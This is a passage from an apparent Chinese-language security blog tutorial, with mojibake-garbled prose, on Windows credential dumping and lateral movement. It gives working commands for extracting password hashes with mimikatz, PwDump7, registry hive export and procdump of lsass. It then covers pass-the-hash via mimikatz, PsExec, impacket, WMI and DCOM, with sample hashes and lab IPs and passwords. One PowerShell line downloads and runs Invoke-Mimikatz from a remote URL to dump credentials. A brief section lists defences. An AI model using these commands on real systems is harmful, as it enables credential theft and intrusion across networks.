<p>ÂêéÊù•‰∏∫‰∫ÜÊèêÈ´òÈíàÂØπÁ†¥Ëß£ÁöÑSAMÊï∞ÊçÆÂ∫ìÁöÑÂÆâÂÖ®ÊÄß, Microsoft Âú®Windows NT 4.0 ‰∏≠ÂºïÂÖ•‰∫ÜSYSKEYÂäüËÉΩ„ÄÇËØ•ÂäüËÉΩ‰ºö‰ΩøÁî®ÂØÜÈí•ÂØπÂ≠òÂÇ®Âú®SAM‰∏≠ÁöÑÊâÄÊúâÊú¨Âú∞Ë¥¶Êà∑ÁöÑÂØÜÁ†ÅÂìàÂ∏åÂÄºËøõË°åÂä†ÂØÜ„ÄÇÂèØ‰ª•ÈÄöËøá<code>syskey</code>Á®ãÂ∫èÊù•ÂêØÁî®ÂÆÉ„ÄÇ</p>
</blockquote>
<h4 id="hashÊäìÂèñ"><a href="#hashÊäìÂèñ" class="headerlink" title="hashÊäìÂèñ"></a>hashÊäìÂèñ</h4><p>ÊØîËæÉËÄÅÁöÑÂ∑•ÂÖ∑Ôºö<a target="_blank" rel="noopener" href="http://www.tarasco.org/security/pwdump_7/index.html">PwDump7</a>ÔºåÈúÄË¶ÅÁÆ°ÁêÜÂëòÊùÉÈôê</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">usage:<br>pwdump7.<span class="hljs-keyword">exe</span> (Dump <span class="hljs-built_in">system</span> passwords)<br>pwdump7.<span class="hljs-keyword">exe</span> -s <span class="hljs-symbol">&lt;samfile&gt;</span> <span class="hljs-symbol">&lt;systemfile&gt;</span> (Dump passwords from <span class="hljs-keyword">files</span>)<br>pwdump7.<span class="hljs-keyword">exe</span> -d <span class="hljs-symbol">&lt;filename&gt;</span> [destionation] (Copy filename <span class="hljs-keyword">to</span> destionation)<br>pwdump7.<span class="hljs-keyword">exe</span> -h (Show this <span class="hljs-keyword">help</span>)<br></code></pre></td></tr></table></figure>

<p>ÈùûÂ∏∏Âá∫ÂêçÁöÑÂ∑•ÂÖ∑Ôºö<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></p>
<blockquote>
<ul>
<li>lsass.exeËøõÁ®ãËØªÂèñ(ÂÜÖÂ≠ò)</li>
</ul>
<p>privilege::debug //ÊèêÂçáËá≥debugÊùÉÈôê</p>
<p>sekurlsa::logonpasswords //‰ªélsass.exeÁöÑÂÜÖÂ≠ò‰∏≠ÊäìÂèñÂØÜÁ†Åhash</p>
<p>//mimikatz.exe ‚Äúprivilege::debug‚Äù ‚Äúlog‚Äù ‚Äúsekurlsa::logonpasswords‚Äù</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220102572.png" srcset="/img/loading.gif" lazyload></p>
<ul>
<li>online</li>
</ul>
<p>privilege::debug</p>
<p>token::elevate //Ê®°Êãü‰∏Ä‰∏™SYSTEM‰ª§Áâå</p>
<p>lsadump::sam //‰ªésamÊñá‰ª∂ÂØºÂá∫ÂØÜÁ†Åhash</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220228030.png" srcset="/img/loading.gif" lazyload></p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/peterdocter/quarkspwdump">QuarkPwDump</a>ÔºåÈúÄÁºñËØë</p>
<p>ËøòÂèØ‰ª•ÂØºÂá∫<code>SAMÂíåSYSTEM</code>Êñá‰ª∂ÂÜçÊäìÂèñÂØÜÁ†Å</p>
<blockquote>
<p>reg save HKLM\SYSTEM system.hive</p>
<p>reg save HKLM\SAM sam.hive</p>
<p>reg save HKLM\security security.hive</p>
</blockquote>
<p>Â∞ÜÊääÂØºÂá∫ÁöÑ<code>sam.hive</code>Ë∑ü<code>system.hive</code>Êñá‰ª∂ÊîæÂà∞<code>mimikatz</code>‰∏ã</p>
<blockquote>
<ul>
<li>offline</li>
</ul>
<p>lsadump::sam /sam:sam.hive /system:system.hive</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220447046.png" srcset="/img/loading.gif" lazyload></p>
</blockquote>
<ul>
<li>ËøõÁ®ãÂØºÂá∫</li>
</ul>
<ol>
<li><p>‰ªªÂä°ÁÆ°ÁêÜÂô®-&gt;ËøõÁ®ã‰∏≠ÂàõÂª∫ËΩ¨ÂÇ®Êñá‰ª∂</p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">Procdump</a>ÊòØÂæÆËΩØÁöÑÂ∑•ÂÖ∑ÔºåÊùÄÊØíËΩØ‰ª∂‰∏ç‰ºöÊã¶Êà™</p>
</li>
</ol>
<blockquote>
<p>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</p>
<p>ÂÜçmimikatzÂØºÂá∫ÂØÜÁ†Åhash</p>
<p>sekurlsa::minidump lsass.DMP<br>sekurlsa::logonPasswords full</p>
</blockquote>
<p>cs</p>
<p>powershell</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz -DumpCreds&quot;</span><br><br>powershell <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz -Command \&quot;</span>privilege::debug token::elevate  lsadump::sam <span class="hljs-keyword">exit</span>\<span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure>

<h4 id="Èò≤ËåÉÊäìÂèñÊòéÊñáÂØÜÁ†ÅÂíåhash"><a href="#Èò≤ËåÉÊäìÂèñÊòéÊñáÂØÜÁ†ÅÂíåhash" class="headerlink" title="Èò≤ËåÉÊäìÂèñÊòéÊñáÂØÜÁ†ÅÂíåhash"></a>Èò≤ËåÉÊäìÂèñÊòéÊñáÂØÜÁ†ÅÂíåhash</h4><p><strong>1„ÄÅËÆæÁΩÆActive Directory2012 R2ÂäüËÉΩÁ∫ßÂà´</strong></p>
<p>windows server 2012 R2Êñ∞Â¢û‰∫Ü‰∏Ä‰∏™Âêç‰∏∫<code>Âèó‰øùÊä§ÁöÑÁî®Êà∑</code>ÁöÑÁî®Êà∑ÁªÑ„ÄÇÂ∞ÜÈúÄË¶Å‰øùÊä§ÁöÑÁî®Êà∑ÊîæÂÖ•ËØ•ÁªÑÔºåÂàôÊó†Ê≥ï‰ΩøÁî®mimikatzÁ≠âÂ∑•ÂÖ∑ÊäìÂèñÊòéÊñáÂØÜÁ†ÅÂíåÊï£ÂàóÂÄº‰∫Ü</p>
<p><strong>2„ÄÅÂÆâË£ÖKB2871997</strong></p>
<p>KB2871997ÊòØËß£ÂÜ≥PsExecÊàñIPCËøúÁ®ãÊü•ÁúãÔºàc$ÔºâÈóÆÈ¢òÁöÑË°•‰∏ÅÔºåË¢´‰ΩøÊú¨Âú∞Ë¥¶Âè∑‰∏çÂÜçË¢´ÂÖÅËÆ∏ËøúÁ®ãÊé•ÂÖ•ËÆ°ÁÆóÊú∫Á≥ªÁªüÔºå‰ΩÜÁ≥ªÁªüÈªòËÆ§ÁöÑÊú¨Âú∞ÁÆ°ÁêÜÂëòË¥¶Âè∑AdministratorËøô‰∏™SID‰∏∫500ÁöÑÁî®Êà∑‰æãÂ§ñÔºåÊîπÂêç‰πüÊ≤°Ê≥ïÔºåÂõ†‰∏∫SIDÊòØ‰∏çÂèòÁöÑÔºå‰æùÊóßÂèØ‰ª•Ê®™ÂêëËé∑ÂèñÂÜÖÁΩëÂÖ∂‰ªñËÆ°ÁÆóÊú∫ÁöÑÊùÉÈôêÔºåÈúÄË¶ÅÁ¶ÅÁî®ÈªòËÆ§ÁöÑAdministratorË¥¶Âè∑ÔºåÂàôÂèØÈò≤Âæ°ÂìàÂ∏å‰º†ÈÄí</p>
<p><strong>3„ÄÅÈÄöËøá‰øÆÊîπÊ≥®ÂÜåË°®Á¶ÅÊ≠¢Âú®ÂÜÖÂ≠ò‰∏≠Â≠òÂÇ®ÊòéÊñáÂØÜÁ†Å</strong></p>
<p>WDigestÂçèËÆÆÔºåËØ•ÂçèËÆÆËÉΩÂ§ü‰ΩøWindowsÂ∞ÜÊòéÊñáÂØÜÁ†ÅÂ≠òÂÇ®Âú®ÂÜÖÂ≠ò‰∏≠Ôºå‰ª•Êñπ‰æøÁî®Êà∑ÁôªÂΩïÊú¨Âú∞ËÆ°ÁÆóÊú∫ÔºåÂèØÈÄöËøá‰øÆÊîπÊ≥®ÂÜåË°®ÁöÑÊñπÂºèÔºåËß£ÂÜ≥ÂÜÖÂ≠ò‰∏≠‰ª•ÊòéÊñáÂ≠òÂÇ®ÂØÜÁ†ÅÁöÑÈóÆÈ¢ò</p>
<p><strong>4„ÄÅÈò≤Âæ°mimikatz</strong></p>
<p>mimikatzÂú®ÊäìÂèñÊï£ÂàóÂÄºÊàñÊòéÊñáÂØÜÁ†ÅÊó∂ÈúÄË¶Å‰ΩøÁî®DebugÊùÉÈôêÔºàÂõ†‰∏∫mimikatzÈúÄÂëÄÂíålsassËøõÁ®ãËøõË°å‰∫§‰∫íÔºåÂ¶ÇÊûúÊ≤°ÊúâDebugÊùÉÈôêÔºåmimikatzÂ∞Ü‰∏çËÉΩËØªÂèñlsassËøõÁ®ãÔºâ„ÄÇÂ∞ÜÊã•ÊúâDebugÊùÉÈôêÁöÑÊú¨Âú∞ÁÆ°ÁêÜÂëò‰ªéAdministratorÁªÑ‰∏≠Âà†Èô§,ÈáçÂêØ</p>
<h2 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass The Hash"></a>Pass The Hash</h2><p><strong>Êà™ÂèñÂà∞hashÂêéÔºåÂìàÂ∏å‰º†ÈÄí‰∏ÄËà¨ÊòØÂú®ÈùûÂüüÁî®Êà∑‰∏≠ËøõË°å‰º†ÈÄíÔºåÂÆûÈ™åÊó∂ÂèëÁé∞ÔºåÂüüÁî®Êà∑‰∏çÁî®ËøõË°åhash‰º†ÈÄíÂ∞±ÂèØ‰ª•Âª∫Á´ãIPCËøûÊé•</strong></p>
<p><code>ÂìàÂ∏å‰º†ÈÄíÔºàPass The HashÔºâÊîªÂáª</code>ÔºåËØ•ÊñπÊ≥ïÈÄöËøáÊâæÂà∞‰∏éË¥¶Êà∑Áõ∏ÂÖ≥ÁöÑÂØÜÁ†ÅÊï£ÂàóÂÄºÔºåÈÄöÂ∏∏ÊòØ<code>NTLM Hash</code>Êù•ËøõË°åÊîªÂáª„ÄÇÂüüÁéØÂ¢É‰∏≠ÔºåÁî®Êà∑ÁôªÂΩïËÆ°ÁÆóÊú∫Êó∂‰ΩøÁî®ÁöÑÂ§ßÈÉΩÊòØÂüüË¥¶Âè∑ÔºåÂ§ßÈáèËÆ°ÁÆóÊú∫Âú®ÂÆâË£ÖÊó∂‰ºö‰ΩøÁî®Áõ∏ÂêåÁöÑÊú¨Âú∞ÁÆ°ÁêÜÂëòË¥¶Âè∑ÂíåÂØÜÁ†Å„ÄÇËã•ËÆ°ÁÆóÊú∫ÁöÑÊú¨Âú∞ÁÆ°ÁêÜÂëòË¥¶Âè∑ÂíåÂØÜÁ†ÅÊòØÁõ∏ÂêåÁöÑÔºåÂ∞±ÂèØ‰ª•‰ΩøÁî®ÂìàÂ∏å‰º†ÈÄíÁöÑÊñπÊ≥ïÁôªÂΩïÂÜÖÁΩë‰∏≠ÁöÑÂÖ∂‰ªñËÆ°ÁÆóÊú∫ÔºåËøôÁßçÂìàÂ∏å‰º†ÈÄíÔºåÂèØ‰ª•ÁúÅÂéªÁ†¥Ëß£ÂØÜÁ†ÅÊï£ÂàóÂÄºÔºåÂç≥Ëé∑ÂæóÂØÜÁ†ÅÊòéÊñáÁöÑÊ≠•È™§</p>
<p>Windows‰∏≠ÔºåÊï£ÂàóÂÄºÊòØÁî®Êù•ËØÅÊòéË∫´‰ªΩÁöÑÔºàÊúâÊ≠£Á°ÆÁöÑÁî®Êà∑ÂêçÂíåÂØÜÁ†ÅÊï£ÂàóÂÄºÔºåÂ∞±ËÉΩÈÄöËøáÈ™åËØÅÔºâ„ÄÇÂú®windows server 2012 R2  Âèä‰πãÂêéÁöÑÊìç‰ΩúÁ≥ªÁªü‰∏≠ÔºåÈªòËÆ§Âú®ÂÜÖÂ≠ò‰∏ç‰ºöËÆ∞ÂΩïÊòéÊñáÂØÜÁ†Å„ÄÇÂõ†Ê≠§ÂèØ‰ΩøÁî®Â∑•ÂÖ∑Â∞ÜÊï£ÂàóÂÄº‰º†ÈÄíÂà∞ÂÖ∂‰ªñËÆ°ÁÆóÊú∫ÔºåËøõË°åÊùÉÈôêÈ™åËØÅÔºåËøõËÄåÂØπÂÖ∂‰ªñËÆ°ÁÆóÊú∫Ëé∑ÂèñÊéßÂà∂ÊùÉÈôê</p>
<ol>
<li>mimikatz</li>
</ol>
<blockquote>
<p>privilege::debug</p>
<p>sekurlsa::pth /user:Administrator /domain:god /ntlm:8a963371a63944419ec1adf687bb1be5  //‰ΩøÁî®ntlm‰º†ÈÄí</p>
<p><strong>Pass the key</strong></p>
<p>‰πüÂèØ‰ª•Áî®AES-256Á≠â‰º†ÈÄíÔºå<strong>Ëé∑ÂèñÔºösekurlsa::ekeys</strong>  </p>
<p>ËøòÊòØ‰ΩøÁî®IPCÁ≠âÊó†ÂØÜÁ†ÅËøûÊé•Âà∞ÁõÆAESÊ†á‰∏ªÊú∫Ôºådir \STU1\C$</p>
</blockquote>
<p>ÂèØËßÅÔºåÊ≤°ÊúâËøõË°åhash‰øÆÊîπÁöÑIPCÁ≠âËøûÊé•‰ºöÂá∫Áé∞ÁôªÂΩïÂ§±Ë¥•</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404135504518.png" srcset="/img/loading.gif" lazyload></p>
<ol start="2">
<li>psexec</li>
</ol>
<p>ÂæÆËΩØÂÆòÊñπÁâàÊú¨Ôºö<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></p>
<blockquote>
<p>ÈúÄË¶ÅËøúÁ®ãÁ≥ªÁªüÂºÄÂêØadmin$ÂÖ±‰∫´ÔºàÈªòËÆ§ÊòØÂºÄÂêØÁöÑÔºâ</p>
<p>Âú®‰ΩøÁî®ipc$ËøûÊé•ÁõÆÊ†áÁ≥ªÁªüÂêéÔºå‰∏çÈúÄË¶ÅËæìÂÖ•Ë¥¶Âè∑ÂíåÂØÜÁ†Å</p>
<p>‰ΩøÁî®PsExecÊâßË°åÂëΩ‰ª§Êó∂ÔºåÁî±‰∫éÂàõÂª∫ÊàñÂà†Èô§ÊúçÂä°Êó∂<strong>‰ºö‰∫ßÁîüÂ§ßÈáèÁöÑÊó•ÂøóÔºåÂèØÈÄöËøáÊó•ÂøóÂèçÊé®ÊîªÂáªÊµÅÁ®ã</strong></p>
<p><strong>‰ΩøÁî®PsExecÂèØ‰ª•Áõ¥Êé•Ëé∑ÂæósystemÊùÉÈôêÁöÑ‰∫§‰∫íÂºèshell</strong></p>
<p>Âª∫Á´ãIPCÂêé‰ΩøÁî®ÔºåÂèØ‰ª•ÂºπÂõû‰∏Ä‰∏™shell</p>
<p>net use \\192.168.20.128 ‚Äúpassword‚Äù /user:Administrator</p>
<p>//-accepteula Á¨¨‰∏ÄÊ¨°ÊâßË°åPsExecÊó∂‰ºöÂºπÂá∫Á°ÆËÆ§Ê°ÜÔºåËÄå‰ΩøÁî®ËØ•ÂèÇÊï∞Â∞±ÂèØ‰ª•Âú®ÈùôÈªòÊ®°Âºè‰∏ãËøêË°åËÄå‰∏ç‰ºöË¢´ÂèëÁé∞ -s system</p>
<p>psexec.exe -accepteula \\192.168.20.128 -s cmd.exe</p>
<p>psexec.exe -accepteula \\192.168.20.128 cmd.exe</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/psexec.gif" srcset="/img/loading.gif" lazyload alt="psexec"></p>
<p>Ê≤°ÊúâÂª∫Á´ãIPC</p>
<p>PsExec.exe \192.168.20.128 -u QWE\Administrator -p password cmd.exe</p>
</blockquote>
<p>‰ΩøÁî®PsExecÔºå‰ºöÂú®ÁõÆÊ†áÊú∫‰∏≠ÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑÊúçÂä°PSEXESVCÔºõÂú®ÁªìÊùü‰∫§‰∫íÂêéÔºåPsExecÊúçÂä°‰ºöËá™Âä®Âà†Èô§Ôºå‰ΩÜÊòØÂú®ÂàõÂª∫‰ª•ÂèäÂà†Èô§Êó∂‰ºö‰∫ßÁîüÂ§ßÈáèÊó•Âøó‰ø°ÊÅØÔºåÊâÄ‰ª•ÂèØ‰ª•Âü∫‰∫éÊ≠§ÂØπÊîªÂáªËÄÖËøõË°åÊ∫ØÊ∫ê„ÄÇÊãúËØª‰∫Ü‰∏Ä‰∏ã<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/146441.html">ÈÖí‰ªôÊ°•ÂÖ≠Âè∑ÈÉ®ÈòüÁöÑÊµÖË∞àPSEXECÂÅöÁöÑÈÇ£‰∫õ‰∫ã</a></p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220405133254579.png" srcset="/img/loading.gif" lazyload></p>
<p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">impacket</a></p>
<blockquote>
<p>python psexec.py  <a href="mailto:&#x41;&#x64;&#109;&#x69;&#110;&#x69;&#x73;&#116;&#114;&#x61;&#x74;&#111;&#114;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#x32;&#x30;&#x2e;&#49;&#x32;&#x38;">&#x41;&#x64;&#109;&#x69;&#110;&#x69;&#x73;&#116;&#114;&#x61;&#x74;&#111;&#114;&#64;&#x31;&#57;&#x32;&#x2e;&#x31;&#54;&#56;&#46;&#x32;&#x30;&#x2e;&#49;&#x32;&#x38;</a>   -hashes 11cb3f697332ae4c82681f36d6708901:aba61272394a2f975d6543aa0541b005</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows">impacket-win</a></p>
<p>ÂæÆËΩØËá™Â∏¶ÁöÑpsexecÊàëÊòØÈÄöËøá‰ΩøÁî®mimikatzÂìàÂ∏å‰º†ÈÄíÂêéÂª∫Á´ãIPCËøûÊé•ÁÑ∂ÂêépsexecÂéªËé∑ÂæóshellÔºåËøô‰∏™Â∑•ÂÖ∑ÂåÖÂèØ‰ª•Ëá™Â∑±pth</p>
<p>Áî®Ê≥ïÔºö</p>
<blockquote>
<p>Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies</p>
<p>usage: psexec.exe [-h] [-c pathname] [-path PATH] [-file FILE] [-debug]<br>               [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]<br>               [-dc-ip ip address] [-target-ip ip address]<br>               [-port [destination port]] [-service-name service name]<br>               target [command [command ‚Ä¶]]</p>
<p>PSEXEC like functionality example using RemComSvc.</p>
<p>positional arguments:<br>target                [[domain/]username[:password]@]&lt;targetName or address&gt;<br>command               command (or arguments if -c is used) to execute at the<br>                     target (w/o path) - (default:cmd.exe)</p>
<p>optional arguments:<br>-h, ‚Äìhelp            show this help message and exit<br>-c pathname           copy the filename for later execution, arguments are<br>                     passed in the command option<br>-path PATH            path of the command to execute<br>-file FILE            alternative RemCom binary (be sure it doesn‚Äôt require<br>                     CRT)<br>-debug                Turn DEBUG output ON</p>
<p>authentication:<br><strong>-hashes LMHASH:NTHASH</strong><br>                     NTLM hashes, format is LMHASH:NTHASH<br>-no-pass              don‚Äôt ask for password (useful for -k)<br>-k                    Use Kerberos authentication. Grabs credentials from<br>                     ccache file (KRB5CCNAME) based on target parameters.<br>                     If valid credentials cannot be found, it will use the<br>                     ones specified in the command line<br>-aesKey hex key       AES key to use for Kerberos Authentication (128 or 256<br>                     bits)</p>
<p>connection:<br>-dc-ip ip address     IP Address of the domain controller. If omitted it<br>                     will use the domain part (FQDN) specified in the<br>                     target parameter<br>-target-ip ip address<br>                     IP Address of the target machine. If omitted it will<br>                     use whatever was specified as target. This is useful<br>                     when target is the NetBIOS name and you cannot resolve<br>                     it<br>-port [destination port]<br>                     Destination port to connect to SMB Server<br>-service-name service name<br>                     This will be the name of the service</p>
</blockquote>
<blockquote>
<p>psexec.exe <a href="mailto:&#65;&#100;&#x6d;&#105;&#110;&#105;&#x73;&#116;&#114;&#97;&#116;&#x6f;&#114;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#x32;&#x30;&#46;&#49;&#50;&#x38;">&#65;&#100;&#x6d;&#105;&#110;&#105;&#x73;&#116;&#114;&#97;&#116;&#x6f;&#114;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#x32;&#x30;&#46;&#49;&#50;&#x38;</a> -hashes 11cb3f697332ae4c82681f36d6708901:aba61272394a2f975d6543aa0541b005</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220405134813532.png" srcset="/img/loading.gif" lazyload></p>
</blockquote>
<p>msf‰πüÊúâpsexecÊ®°Âùó</p>
<ol start="3">
<li>WMI</li>
</ol>
<p>Áî±‰∫éPsExecÂ®ÅÂäõÂæàÂ§ßÔºå‰πüË¢´ÂàóÂÖ•ÈªëÂêçÂçïÔºåËÄå‰∏îÂÆπÊòìÊö¥Èú≤Ôºå‰∫éÊòØÂ∞±‰ΩøÁî®‰∫ÜÈöêËîΩÊÄßÊõ¥Â•ΩÁöÑWMI</p>
<p>WMIÊòØ‚ÄúWindows Management Instrumentation‚ÄùÁöÑÁº©ÂÜôÔºåWMIÊòØ‰ªéWindows98ÂºÄÂßãÔºåÁ≥ªÁªüËá™Â∏¶ÁöÑ‰∏ÄÁ≥ªÂàóÂ∑•ÂÖ∑ÈõÜ„ÄÇWMIÊèê‰æõ‰∫Ü/nodeÈÄâÈ°πÔºåÂèØ‰ª•ÈÄöËøá135Á´ØÂè£‰∏äÁöÑRPCÊúçÂä°ËøõË°åËøúÁ®ãËÆøÈóÆÔºåÊàñËÄÖÊâßË°åËøúÁ®ãÂëΩ‰ª§„ÄÇWindowsÊìç‰ΩúÁ≥ªÁªüÈªòËÆ§‰∏ç‰ºöÂ∞ÜWMIÁöÑÊìç‰ΩúËÆ∞ÂΩïÂà∞Êó•ÂøóÂΩì‰∏≠ÔºåËÄå‰∏îÂõ†‰∏∫ÈááÁî®ÁöÑÊòØÊó†Êñá‰ª∂ÊîªÂáªÔºåÊâÄ‰ª•ÂØºËá¥WMIÂÖ∑ÊúâÊûÅÈ´òÁöÑÈöêËîΩÊÄß„ÄÇÁî±Ê≠§ÔºåË∂äÊù•Ë∂äÂ§öÁöÑAPTÂºÄÂßã‰ΩøÁî®WMIËøõË°åÊîªÂáªÔºåÂà©Áî®WMIÂèØ‰ª•ËøõË°å‰ø°ÊÅØÊî∂ÈõÜ„ÄÅÊé¢Êµã„ÄÅÂèçÁóÖÊØí„ÄÅËôöÊãüÊú∫Ê£ÄÊµã„ÄÅÂëΩ‰ª§ÊâßË°å„ÄÅÊùÉÈôêÊåÅ‰πÖÂåñÁ≠âÊìç‰Ωú„ÄÇ</p>
<blockquote>
<p>wmic /node:192.168.20.128 /user:Administrator /password:p@ssword123. process call create ‚Äúcmd.exe /c ipconfig &gt;c:\ip.txt‚Äù</p>
</blockquote>
<p>Âª∫Á´ãIPCÂêéÔºåtypeËØªÂèñtxt</p>
<blockquote>
<p>net use \DC ‚Äúp@ssword123.‚Äù /user:Administrator<br>type \DC\C$\ip.txt</p>
</blockquote>
<p>‰ΩøÁî®wmicËøúÁ®ãÊâßË°åÂëΩ‰ª§ÔºåÂú®ËøúÁ®ãÁ≥ªÁªü‰∏≠ÂêØÂä®windows management lnstrumentation  ÊúçÂä°ÔºàÁõÆÊ†áÊúçÂä°Âô®ÈúÄË¶ÅÂºÄÊîæ135Á´ØÂè£Ôºåwmic‰ºö‰ª•ÁÆ°ÁêÜÂëòÊùÉÈôêÂú®ËøúÁ®ãÁ≥ªÁªü‰∏≠ÊâßË°åÂëΩ‰ª§Ôºâ„ÄÇÂ¶ÇÊûúÁõÆÊ†áÊúçÂä°Âô®ÂºÄÂêØ‰∫ÜÈò≤ÁÅ´Â¢ôÔºåwmicÂ∞ÜÊó†Ê≥ïËøõË°åËøûÊé•„ÄÇwmicÂëΩ‰ª§Ê≤°ÊúâÂõûÊòæÔºåÈúÄË¶Å‰ΩøÁî®<code>ipc$Âíåtype</code>ÂëΩ‰ª§Êù•ËØªÂèñ‰ø°ÊÅØÔºåËã•‰ΩøÁî®wmicÊâßË°åÊÅ∂ÊÑèÁ®ãÂ∫èÔºåÂ∞Ü‰∏ç‰ºöÁïô‰∏ãÊó•Âøó</p>
<p>ËøòÊòØ‰ΩøÁî®impacketÁöÑ‰∏§‰∏™Â∑•ÂÖ∑ÂåÖÔºåÊúâ‰∫õËøòÊîØÊåÅsocks‰ª£ÁêÜ</p>
<blockquote>
<p>wmiexec.exe domain/user:password@target-ip</p>
<p>wmiexec.exe QWE/Administrator:p@<a href="mailto:&#115;&#x73;&#x77;&#111;&#114;&#x64;&#49;&#x32;&#x33;&#x2e;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#50;&#48;&#x2e;&#x31;&#x32;&#56;">&#115;&#x73;&#x77;&#111;&#114;&#x64;&#49;&#x32;&#x33;&#x2e;&#x40;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#50;&#48;&#x2e;&#x31;&#x32;&#56;</a></p>
</blockquote>
<ol start="4">
<li><a target="_blank" rel="noopener" href="https://github.com/sunorr/smbexec">smbexec</a></li>
<li>DOM</li>
</ol>
<p><code>DCOMÔºàÂàÜÂ∏ÉÂºèÁªÑ‰ª∂ÂØπË±°Ê®°ÂûãÔºâ</code>ÊòØÂæÆËΩØÁöÑ‰∏ÄÁ≥ªÂàóÊ¶ÇÂøµÂíåÁ®ãÂ∫èÊé•Âè£„ÄÇÈÄöËøáDOCM,ÂÆ¢Êà∑Á´ØÁ®ãÂ∫èÂØπË±°ËÉΩÂ§üÂêëÁΩëÁªú‰∏≠ÁöÑÂè¶‰∏ÄÂè∞ËÆ°ÁÆóÊú∫‰∏äÁöÑÊúçÂä°Âô®Á®ãÂ∫èÂØπË±°ÂèëÈÄÅËØ∑Ê±Ç„ÄÇDCOMÊòØÂü∫‰∫éÁªÑ‰ª∂ÂØπË±°Ê®°ÂûãÔºàCOMÔºâÁöÑ„ÄÇCOMÊèê‰æõ‰∫Ü‰∏ÄÂ•óÂÖÅËÆ∏Âú®Âêå‰∏ÄÂè∞ËÆ°ÁÆóÊú∫‰∏äÁöÑÂÆ¢Êà∑Á´ØÂíåÊúçÂä°Âô®‰πãÈó¥ËøõË°åÈÄö‰ø°ÁöÑÊé•Âè£ÔºàËøêË°åÂú®Windows95Âèä‰πãÂêéÁâàÊú¨ÁöÑÊìç‰ΩúÁ≥ªÁªü‰∏≠Ôºâ</p>
<p><code>Get-CimInstance</code>Ëøô‰∏™cmdletÔºàPowerShellÂëΩ‰ª§Ë°åÔºâÈªòËÆ§Âè™Âú®powershell3.0‰ª•‰∏äÁâàÊú¨‰∏≠Â≠òÂú®„ÄÇÂõ†Ê≠§Âè™Âú®windows server 2012Âèä‰ª•‰∏äÊú¨Êú¨ÁöÑÊìç‰ΩúÁ≥ªÁªüÊâçÂèØ‰ª•‰ΩøÁî®Get-CimInstance</p>
<blockquote>
<p> Get-CimInstance Win32_DCOMApplication //Ëé∑ÂèñDCOMÁ®ãÂ∫èÂàóË°®</p>
</blockquote>
<p><code>Windows7„ÄÅWindows server 2008</code>‰∏≠ÈªòËÆ§ÂÆâË£ÖÁöÑÊòØ<code>powershell 2.0</code>„ÄÇ‰∏çÊîØÊåÅGet-CimInstance„ÄÇÂèØ‰ª•‰ΩøÁî®Â¶Ç‰∏ãÂëΩ‰ª§‰ª£Êõø</p>
<blockquote>
<p>Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication //Ëé∑ÂèñDCOMÁ®ãÂ∫èÂàóË°®</p>
</blockquote>
<p>Ëé∑ÂèñÂà∞DCOMÁ®ãÂ∫èÂàóË°®ÂêéÔºå<strong>Âª∫Á´ãIPC</strong>ÔºåÊúÄÂêéÊâßË°åÂëΩ‰ª§(Ëøô‰∏™ÊñπÊ≥ïÈúÄË¶ÅÂÖ≥Èó≠Á≥ªÁªüÈò≤ÁÅ´Â¢ô„ÄÇÂú®ËøúÁ®ãÊú∫Âô®‰∏äÊâßË°åÂëΩ‰ª§Êó∂ÔºåÂøÖÈ°ª‰ΩøÁî®ÂÖ∑ÊúâÊú¨Âú∞ÁÆ°ÁêÜÂëòÊùÉÈôêÁöÑË¥¶Âè∑)</p>
<ul>
<li>Ë∞ÉÁî®<code>MMC20.Application</code>ËøúÁ®ãÊâßË°åÂëΩ‰ª§</li>
</ul>
<blockquote>
<p>$com=[activator]::CreateInstance([type]::GetTypeFromProgID(‚ÄúMMC20.Application‚Äù,‚Äùip‚Äù))<br>$com.Document.ActiveView.ExecuteShellCommand(‚Äòcmd.exe‚Äô,$null,‚Äù/c calc.exe‚Äù,‚ÄùMinimzed‚Äù)</p>
</blockquote>
<ul>
